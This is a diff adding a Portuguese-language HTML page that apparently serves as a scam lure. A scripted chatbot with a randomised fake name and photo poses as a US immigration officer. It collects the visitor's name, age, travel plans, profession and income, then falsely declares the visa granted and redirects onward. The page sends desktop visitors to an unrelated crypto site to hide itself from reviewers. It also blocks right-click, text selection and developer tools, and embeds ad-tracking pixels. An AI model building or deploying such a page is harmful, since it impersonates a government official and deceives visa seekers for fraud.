@@ -1,0 +1,423 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script async="" src="js/fbevents.js"></script><script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://dogwifcoin.org/';
+        }
+     </script>
+     
+        <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+        function clickIE() {if (document.all) {(message);return false;}}
+        function clickNS(e) {if
+        (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {(message);return false;}}}
+        if (document.layers)
+        {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+        else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+        document.oncontextmenu=new Function("return false")
+        </script>
+        
+        <script>
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+        }
+        </script>
+        
+        <script>
+        function disableselect(e) {
+            return false;
+        }
+        
+        function reEnable() {
+            return true;
+        }
+        
+        document.onselectstart = new Function("return false");
+        
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+        </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat de Perguntas</title>
+    <style>
+        body, html {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+         /* Adicione aqui para evitar zoom */
+    #inputBox {
+        font-size: 16px; /* Evita o zoom em dispositivos móveis */
+    }
+
+        .chat-container {
+            width: 100%;
+            height: 100%;
+            max-width: 100%;
+            max-height: 100%;
+            display: flex;
+            flex-direction: column;
+            background-color: white;
+            border: 1px solid #ddd;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        /* Estilização da imagem de banner */
+        #banner {
+            width: 100%;
+            height: auto;
+            max-height: 200px; /* Ajusta a altura máxima */
+            object-fit: cover; /* Cobre toda a área sem distorcer */
+        }
+
+        #alertBox {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            padding: 10px;
+            font-size: 14px;
+            color: #555;
+            margin: 10px 10px 0 10px;
+        }
+
+        #alertBox i {
+            margin-right: 10px;
+            color: #888;
+        }
+
+        #botInfo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        #botImage {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin-bottom: 5px; /* Reduzindo o espaço entre a imagem e o nome */
+        }
+
+        /* Ajuste no nome do bot para ficar mais perto da imagem */
+        #botName {
+            font-size: 18px;
+            font-weight: bold;
+            color: #002855;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+
+        /* Novo estilo para a frase "Oficial de Imigração" */
+        #botTitle {
+            font-size: 14px;
+            color: #555;
+            margin-top: 5px; /* Espaço entre o nome e o título */
+            margin-bottom: 10px; /* Espaço abaixo do título */
+        }
+
+        #chatbox {
+            flex: 1;
+            padding: 20px;
+            background-color: #fff;
+            overflow-y: auto;
+        }
+
+        .message {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            word-wrap: break-word;
+        }
+
+        .message.bot {
+            justify-content: flex-start;
+        }
+
+        .message.user {
+            justify-content: flex-end;
+        }
+
+        .bubble {
+            padding: 10px;
+            border-radius: 10px;
+            background-color: #e0e0e0;
+            max-width: 70%;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .bubble.bot {
+            background-color: #f1f1f1;
+        }
+
+        .bubble.user {
+            background-color: #dcdcdc;
+        }
+
+        /* Estilo para o "está digitando..." */
+        #typing {
+            font-style: italic;
+            color: #888;
+            margin-top: 10px;
+            display: none; /* Oculto por padrão */
+        }
+
+        #inputArea {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: white;
+            border-top: 1px solid #ccc;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        #inputBox {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+            width: 100%;
+        }
+
+        #sendButton {
+            padding: 10px 20px;
+            background-color: #ff4c4c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #sendButton:hover {
+            background-color: #d43b3b;
+        }
+
+        @media (max-width: 768px) {
+            #inputArea {
+                width: 100%;
+                max-width: 100%;
+            }
+
+            .bubble {
+                max-width: 90%;
+            }
+        }
+
+    </style>
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1238265364044087');
+    fbq('track', 'PageView');
+    </script><script async="" defer="" src="js/pixel.js"></script></head>
+
+    <body><noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1238265364044087&ev=PageView&noscript=1"
+    /></noscript>
+    <script>
+        window.pixelId = "67243e70e257ad639df7c22c";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+
+
+<div class="chat-container">
+    <!-- Substituindo o cabeçalho por um banner -->
+    <img id="banner" src="images/banner%20consulado.png" alt="Banner do Chat">
+
+    <div id="alertBox">
+        <i class="info-icon">ℹ️</i>
+        <span>Para manter a conversa ativa, responda em até 5 minutos.</span>
+    </div>
+
+    <div id="botInfo">
+        <img id="botImage" src="images/David%20Thompson.jpeg" alt="Bot Image">
+        <p id="botName">David Thompson</p>
+        <!-- Adicionando a frase abaixo do nome do bot -->
+        <p id="botTitle">Oficial de Imigração</p>
+    </div>
+
+    <div id="chatbox">
+        <div class="message bot">
+            <div class="bubble bot" id="question">Olá! Vamos começar?</div>
+        </div>
+        <!-- Digitando sempre abaixo das perguntas -->
+        <div id="typing" style="display: block;">David Thompson está digitando...</div>
+    </div>
+
+    <div id="inputArea">
+        <input type="text" id="inputBox" placeholder="Digite sua resposta aqui...">
+        <button id="sendButton">Enviar</button>
+    </div>
+</div>
+
+<script>
+    const nomesBot = [
+        "Emily Johnson", "Michael Harrison", 
+        "Sarah Williams", "David Thompson", "Elizabeth Miller", 
+        "John Anderson", "Rachel Davis", "Christopher Evans", 
+        "Samantha Brown"
+    ];
+
+    const imagensBot = {
+        "John Anderson": "images/John Anderson.jpeg",
+        "Christopher Evans": "images/Christopher Evans.jpeg",
+        "Michael Harrison": "images/Michael Harrison.jpeg",
+        "David Thompson": "images/David Thompson.jpeg",
+        "Elizabeth Miller": "images/Elizabeth Miller.jpeg",
+        "Emily Johnson": "images/Emily Johnson.jpeg",
+        "Rachel Davis": "images/Rachel Davis.jpeg",
+        "Samantha Brown": "images/Samantha Brown.jpeg",
+        "Sarah Williams": "images/Sarah Williams.jpeg"
+    };
+
+    const nomeDoBot = nomesBot[Math.floor(Math.random() * nomesBot.length)];
+    let nomeDoUsuario = "";
+
+    document.getElementById('botName').textContent = nomeDoBot;
+    const imgSrc = imagensBot[nomeDoBot] || 'images/default-image.jpg';
+    document.getElementById('botImage').src = imgSrc;
+
+    const perguntas = [
+        `Tudo bem? Me chamo ${nomeDoBot}! Qual é o seu nome?`,
+        "Qual a sua idade?",
+        "Qual será o seu destino principal ao chegar nos E.U.A?",
+        "Por quanto tempo você pretende permanecer nos E.U.A?",
+        "Qual é a sua profissão ou cargo no momento?",
+        "Qual é a sua faixa de renda mensal?"
+    ];
+
+    let indicePergunta = 0;
+
+    function botTyping(show) {
+        const typingIndicator = document.getElementById('typing');
+        if (show) {
+            typingIndicator.textContent = `${nomeDoBot} está digitando...`;
+            typingIndicator.style.display = 'block'; // Exibe o indicador
+        } else {
+            typingIndicator.style.display = 'none'; // Oculta o indicador
+        }
+        document.getElementById('chatbox').scrollTop = document.getElementById('chatbox').scrollHeight;
+    }
+
+    function enviarPergunta() {
+        if (indicePergunta < perguntas.length) {
+            botTyping(true);
+            setTimeout(() => {
+                botTyping(false);
+                adicionarMensagemBot(perguntas[indicePergunta]);
+                indicePergunta++;
+            }, 2000); // Simula o tempo de digitação
+        } else {
+            // Começa a exibir as frases finais
+            setTimeout(() => {
+                adicionarMensagemBot(`Entendi, certo ${nomeDoUsuario}`);
+                setTimeout(() => {
+                    adicionarMensagemBot(`${nomeDoUsuario}, Welcome to the United States of America!`);
+                    setTimeout(() => {
+                        adicionarMensagemBot("Parabéns, seu visto foi concedido!");
+                        // Redireciona após 5 segundos
+                        setTimeout(() => {
+                            window.location.href = 'loadingg.html'; // Substitua pela URL desejada
+                        }, 5000); // Aguarda 5 segundos antes de redirecionar
+                    }, 5000); // 5 segundos após a segunda frase
+                }, 14000); // 14 segundos após a primeira frase final
+            }, 10000); // 10 segundos após a última pergunta
+        }
+    }
+
+    function adicionarMensagemBot(texto) {
+        const chatbox = document.getElementById('chatbox');
+        const messageDiv = document.createElement('div');
+        messageDiv.classList.add('message', 'bot');
+        const bubbleDiv = document.createElement('div');
+        bubbleDiv.classList.add('bubble', 'bot');
+        bubbleDiv.textContent = texto;
+        messageDiv.appendChild(bubbleDiv);
+        chatbox.appendChild(messageDiv); // Adiciona após a resposta do usuário
+        chatbox.appendChild(document.getElementById('typing')); // Reposiciona o "está digitando..." abaixo
+        chatbox.scrollTop = chatbox.scrollHeight; // Sempre rola para o fim
+    }
+
+    function adicionarMensagemUsuario(texto) {
+        const chatbox = document.getElementById('chatbox');
+        const messageDiv = document.createElement('div');
+        messageDiv.classList.add('message', 'user');
+        const bubbleDiv = document.createElement('div');
+        bubbleDiv.classList.add('bubble', 'user');
+        bubbleDiv.textContent = texto;
+        messageDiv.appendChild(bubbleDiv);
+        chatbox.appendChild(messageDiv); // Adiciona a resposta do usuário
+        chatbox.scrollTop = chatbox.scrollHeight;
+    }
+
+    function processarRespostaUsuario() {
+        const inputBox = document.getElementById('inputBox');
+        const resposta = inputBox.value.trim();
+        if (resposta) {
+            adicionarMensagemUsuario(resposta);
+            inputBox.value = "";
+
+            if (indicePergunta === 1) {
+                nomeDoUsuario = resposta;
+                perguntas[1] = `${nomeDoUsuario}, qual a sua idade?`;
+                perguntas[2] = `${nomeDoUsuario}, qual será o seu destino principal ao chegar nos E.U.A?`;
+                perguntas[3] = `${nomeDoUsuario}, por quanto tempo você pretende permanecer nos E.U.A?`;
+                perguntas[4] = `${nomeDoUsuario}, qual é a sua profissão ou cargo no momento?`;
+                perguntas[5] = `${nomeDoUsuario}, qual é a sua faixa de renda mensal?`;
+            }
+
+            enviarPergunta(); 
+        }
+    }
+
+    document.getElementById('sendButton').addEventListener('click', processarRespostaUsuario);
+
+    document.getElementById('inputBox').addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+            processarRespostaUsuario();
+        }
+    });
+
+    enviarPergunta(); // Inicia com a primeira pergunta
+</script>
+
+
+
+</body></html>
